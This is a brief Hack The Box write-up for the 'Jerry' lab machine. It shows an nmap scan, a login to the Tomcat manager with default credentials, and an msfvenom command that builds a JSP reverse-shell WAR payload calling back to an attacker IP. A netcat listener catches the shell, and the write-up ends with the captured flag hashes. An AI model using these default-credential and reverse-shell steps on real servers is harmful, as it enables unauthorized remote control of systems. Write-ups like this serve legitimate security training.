# Jerry - Hack the Box - Report

first things first.

## Nmap scan

`nmap -p 1-65535 -T4 -A -v jerry`

    PORT     STATE SERVICE VERSION
    8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1

## Website Enumeration

I took a look around the website. I tried logging into the manager with some default creds. I simply googled tomcat default creds.

I got an error web page containing `tomcat:s3cret`

I tried this for logging into the manager and it worked.

### Manager

#### Findings

- OS: Windows Server 2012 R2
- JVM: 1.8.0_171-b11

I see that there is a way to upload a war file. I used msfvenom to create a payload

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.32 LPORT=4444 -f war > jerryhack.war
`

I setup a listener

` nc -lvnp 4444`

## Enumeration

That .war worked so we are on the windows box. I navigated to the Administrator directory.

I found a flags directory with a text file called `2 for the price of 1.txt`

    C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
    type "2 for the price of 1.txt"
    user.txt
    7004dbcef0f854e0fb401875f26ebd00

    root.txt
    04a8b36e1545a455393d067e772fe90e
